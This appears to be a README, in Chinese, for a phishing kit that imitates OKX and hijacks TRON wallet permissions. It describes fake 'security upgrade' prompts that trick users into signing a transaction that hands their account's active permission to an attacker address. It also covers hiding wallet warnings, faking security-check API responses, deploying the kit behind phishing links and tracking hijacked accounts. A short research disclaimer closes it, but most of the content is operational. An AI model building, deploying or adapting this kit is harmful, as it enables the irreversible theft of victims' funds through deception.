# 🎯 OKX权限劫持攻击研究系统 (okx-moreName)

## 📋 项目概述

基于360安全团队收集的信息，本项目复现了一种比传统代币授权攻击更加危险的新型攻击方式：**TRON账户权限劫持攻击**。

### ⚡ 攻击原理

通过伪装成"升级安全性"、"绑定安全节点"、"绑定智能合约"等合理操作，诱导用户签名`Update Account Permission`交易，从而：

- 🎯 **控制账户权限**: 将用户的`active`权限替换为攻击者控制的公钥
- 🎯 **完全控制资产**: 用户原私钥无法再发起任何转账操作
- 🎯 **用户无感知**: 攻击完成后用户会看到"缺少管理员权限"错误
- 🎯 **无法恢复**: 比代币授权更彻底，用户完全失去账户控制权

## 🏗️ 系统架构

### 核心攻击组件

1. **`tron-permission-hijack.js`** - 权限劫持攻击核心系统
   - 伪装的安全升级界面
   - TRON账户权限修改交易构建
   - 多种伪装操作类型（安全升级/节点绑定/合约绑定）

2. **`integrated-security-bypass.js`** - 集成安全绕过系统
   - 专门针对权限修改操作的安全检测绕过
   - 权限相关警告的智能隐藏
   - API请求拦截和伪造响应

3. **`permission-hijack-tester.js`** - 攻击系统测试器
   - 完整性测试和功能验证
   - 健康检查和错误诊断

### 继承的传统攻击系统

- 保留了原有的代币授权攻击功能
- 集成了所有现有的安全绕过机制
- 向下兼容，支持多种攻击方式

## 🎭 攻击流程

### 1. 环境检测
```javascript
// 自动检测用户钱包连接
detectTronWallet() -> 获取目标地址
```

### 2. 伪装界面展示
用户看到的三种随机伪装操作：
- 🔐 **升级账户安全性** - "启用多重签名保护"
- 🌐 **绑定安全节点** - "连接OKX官方高速节点"  
- 📄 **绑定智能合约** - "享受专属DeFi服务"

### 3. 权限劫持交易
```javascript
// 构建AccountPermissionUpdateContract交易
buildPermissionTransaction() -> {
    type: 2, // Active权限类型
    permission_name: "active",
    threshold: 1,
    keys: [{ 
        address: ATTACKER_ADDRESS, // 攻击者地址
        weight: 1 
    }]
}
```

### 4. 用户签名确认
- 用户在钱包中看到伪装的"升级"描述
- 实际签名的是权限修改交易
- 交易广播后获得账户控制权

### 5. 权限验证测试
- 验证权限是否已被成功修改
- 测试攻击者是否获得完整控制权
- 记录攻击成功信息

## 🛡️ 安全绕过机制

### 关键词隐藏系统
智能隐藏包含以下内容的安全警告：
```javascript
权限修改、账户权限、Update Account Permission
多重签名、权限转移、权限劫持
发现权限风险、权限安全风险、账户权限异常
UpdateAccountPermissions、permission_name、threshold
```

### API拦截系统
拦截并伪造以下安全检查请求：
- `/permission` - 权限检查API
- `/authority` - 权限验证API
- `/multisig` - 多签检查API
- `/account/update` - 账户更新API

### 实时DOM监控
- 实时检测新增的权限警告元素
- 自动隐藏和移除危险提示
- 防止安全页面跳转

## 🔬 测试验证

### 快速健康检查
```javascript
window.PermissionHijackTester.quickCheck()
```

### 完整功能测试
```javascript
window.PermissionHijackTester.runFullTest()
```

### 测试项目包括：
- ✅ 环境检测测试
- ✅ 安全绕过系统测试  
- ✅ 权限劫持初始化测试
- ✅ 用户界面伪装测试
- ✅ 权限交易构建测试
- ✅ 系统集成测试

## 📊 攻击效果

### 成功标志
1. 用户账户的`active`权限被替换为攻击者公钥
2. 用户原私钥无法发起转账（显示"缺少管理员权限"）
3. 攻击者获得用户账户的完整控制权
4. 可以转移用户的所有数字资产

### 统计信息
```javascript
window.PermissionHijack.getStats() // 获取攻击统计
```

## 🚨 危险等级

**极高危险** - 比传统代币授权攻击更危险：

- ❌ **不可逆**: 用户无法通过撤销授权来恢复
- ❌ **完全控制**: 攻击者获得账户的永久控制权  
- ❌ **隐蔽性强**: 伪装成正常的安全升级操作
- ❌ **影响范围大**: 影响用户的所有资产，不仅限于特定代币

## 🔧 使用方法

### 1. 部署环境
```bash
# 将整个okx-moreName目录部署到Web服务器
# 确保所有JS文件可以正常加载
```

### 2. 访问页面
- 用户通过钓鱼链接访问伪装的OKX页面
- 系统自动检测钱包连接
- 显示伪装的安全升级提示

### 3. 监控攻击
```javascript
// 查看攻击状态
window.PermissionHijack.status()

// 查看攻击统计
window.PermissionHijack.getStats()

// 查看被劫持的账户
JSON.parse(localStorage.getItem('hijacked_accounts'))
```

## 🏆 技术特点

1. **新颖性**: 采用权限劫持而非传统授权攻击
2. **隐蔽性**: 伪装成安全升级操作，用户难以识别
3. **彻底性**: 获得账户完全控制权，不可逆转
4. **智能化**: 多层安全绕过，适配各种钱包环境
5. **专业性**: 完整的测试和验证体系

## ⚠️ 安全研究声明

本项目仅供360安全团队进行安全研究和漏洞分析使用。

- 🔬 **研究目的**: 分析新型区块链攻击手段
- 🔬 **学术价值**: 提升区块链安全防护意识  
- 🔬 **防御指导**: 帮助开发更好的安全检测机制

## 📝 技术文档

- **攻击向量**: TRON账户权限系统漏洞利用
- **目标平台**: TRON网络钱包应用
- **攻击载体**: 伪装的Web应用界面
- **利用难度**: 中等（需要社会工程学配合）
- **检测难度**: 高（伪装成正常安全操作）

---

**开发团队**: 360安全团队  
**版本**: v1.0  
**最后更新**: 2024年12月